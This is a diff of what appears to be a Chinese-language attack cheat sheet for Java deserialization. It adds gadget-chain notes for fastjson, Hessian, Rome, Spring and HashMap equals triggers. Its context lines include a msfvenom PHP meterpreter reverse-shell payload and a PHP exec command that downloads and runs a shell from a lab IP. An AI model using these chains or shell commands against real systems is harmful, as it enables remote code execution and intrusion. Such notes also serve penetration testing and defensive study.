@@ -41,6 +41,10 @@ msfvenom -p php/meterpreter/reverse_tcp -f raw LHOST=192.168.127.131 LPORT=4321 
 exec('wget http://192.168.127.131/shell.txt -O /tmp/shell.php;php -f /tmp/shell.php');
 ```
 
+ssti绕过
+
+https://blog.csdn.net/m0_73185293/article/details/131695528
+
 
 
 
@@ -51,13 +55,29 @@ fastjson目标不出网，<=1.2.24下打BCEL，需要回显可以打内存马
 
 目标出网 ，<=1.2.47，打JNDI
 
+1.2.68+commons-io能写文件
+
 
 
 ## Gadget
 
 一个gadget衔接合集，仅统计常用衔接链
 
+Hessian2反序列化和Kryo、FST反序列化会触发hashMap.put
+
+compare通常伴随着任意getter调用（因为compare需要逐项取值对比）
+
 BadAttributeValueExpException.readObject -> toString
+
+(JDK8u65) AnnotationInvocationHandler.invoke -> get
+
+(jdk7u21/8u20 rce) AnnotationInvocationHandler.equalsImpl -> invoke 
+
+PriorityQueue.readObject -> compare
+
+(cb) PropertyUtils.getProperty -> getter
+
+
 
 (jackson/springboot) POJONode.toString -> JSON.writeValueAsString ->getter
 
@@ -69,7 +89,9 @@ BadAttributeValueExpException.readObject -> toString
 
 (fastjson) JSON.parse -> setter
 
-(fastjson) JSON.parseObject -> settter/getter
+(fastjson) JSON.parseObject -> setter/getter
+
+(fastjson) JSONObject.toString -> getter (1.2.83都能打原生二次反序列化)
 
 
 
@@ -81,21 +103,28 @@ JdbcRowSetImpl.setAutoCommit ->  JNDI
 
 
 
-(JDK8u65) AnnotationInvocationHandler.invoke -> get
-
-(jdk7u21/8u20 rce) AnnotationInvocationHandler.equalsImpl -> invoke 
-
-PriorityQueue.readObject -> compare
-
-
-
 (c3p0) ReferenceableUtils#ReferenceSerialized.referenceToObject -> Reference JNDI
 
-(rome) ToStringBean.toString -> invoke
+(rome) ToStringBean.toString -> getter
 
-(tome) EqualsBean.beanEquals -> invoke
+(rome) EqualsBean.beanEquals -> getter
+
+(rome) EqualsBean.hashCode -> toString
 
 (spring) XString.equals -> toString
+
+(spring) HashMap.put -> HotSwappableTargetSource.equals -> equals
+
+HashMap、HashSet、HashTable直接传两个一样的值碰撞也能触发equals（见https://godownio.github.io/2024/09/26/rome-lian/#EqualsBeans%E9%93%BE) 
+
+```
+HashMap/HashSet/HashTable.readObject
+HashMap.put
+HashMap.putval
+HashMap.equals
+Abstractmap.equals
+equals
+```
 
 (spring) ClassPathXmlApplicationContext.ClassPathXmlApplicationContext -> spEL注入
 
@@ -132,6 +161,8 @@ TiedMapEntry.toString -> getValue -> get (CC5)
 
 
 ### hessian
+
+hessian一般伴随着能触发hashMap.put
 
 hessian打TemplatesImpl不能readObject初始化tfactory，直接SignedObject->TemplatesImpl
 
